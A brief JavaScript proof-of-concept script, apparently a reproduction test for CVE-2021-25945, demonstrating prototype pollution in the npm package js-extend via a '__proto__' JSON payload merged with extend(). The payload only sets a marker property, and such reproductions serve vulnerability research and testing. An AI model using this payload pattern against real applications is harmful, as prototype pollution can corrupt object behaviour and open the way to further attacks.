//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25945

const assert = require('assert');
var jsExtend = require("js-extend")
var obj = {}
var malicious_payload = '{"__proto__":{"polluted":"yes"}}';
console.log("Before: " + {}.polluted);
jsExtend.extend({}, JSON.parse(malicious_payload));

console.log("After : " + {}.polluted);
assert({}.polluted === "yes");
console.log("payload success!")